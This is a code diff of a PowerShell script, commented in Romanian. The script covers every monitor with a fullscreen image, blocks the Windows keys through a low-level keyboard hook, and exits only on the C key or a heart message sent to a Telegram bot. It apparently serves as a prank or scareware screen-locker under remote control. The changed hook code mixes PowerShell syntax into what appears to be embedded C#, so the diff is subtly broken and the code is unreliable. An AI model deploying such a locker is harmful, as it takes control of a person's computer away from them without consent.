@@ -44,7 +44,7 @@ function Start-Telegram-Listener {
                     $lastUpdateId = $update.update_id
                     $txt = $update.message.text
                     if ($txt -eq "❤️" -or $txt -like "*❤*") {
-                        [System.Windows.Forms.Application]::Exit()
+                        [Environment]::Exit(0)
                     }
                 }
             }
@@ -90,16 +90,20 @@ function Block-And-MonitorKeys {
             }
 
             private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-                    int vkCode = Marshal.ReadInt32(lParam);
-                    if (vkCode == 0x43) {
-                        [System.Windows.Forms.Application]::Exit()
+                if (nCode >= 0 && wParam -eq (IntPtr)WM_KEYDOWN) {
+                    int vkCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
+
+                    # Tasta C
+                    if ($vkCode -eq 0x43) {
+                        [Environment]::Exit(0)
                     }
-                    if (vkCode -eq 0x5B -or vkCode -eq 0x5C) {
+
+                    # Tasta Windows stânga și dreapta
+                    if ($vkCode -eq 0x5B -or $vkCode -eq 0x5C) {
                         return [IntPtr]1
                     }
                 }
-                return CallNextHookEx(hookId, nCode, wParam, lParam);
+                return CallNextHookEx(hookId, nCode, wParam, lParam)
             }
         }
 "@
@@ -142,7 +146,8 @@ function Show-FullScreenImage {
 
     foreach ($form in $forms) { [void]$form.Show() }
 
-    Start-Job -ScriptBlock { Start-Telegram-Listener }
+    # Ascultă mesajele Telegram direct în thread principal
+    Start-Telegram-Listener
     [System.Windows.Forms.Application]::Run()
 }
 
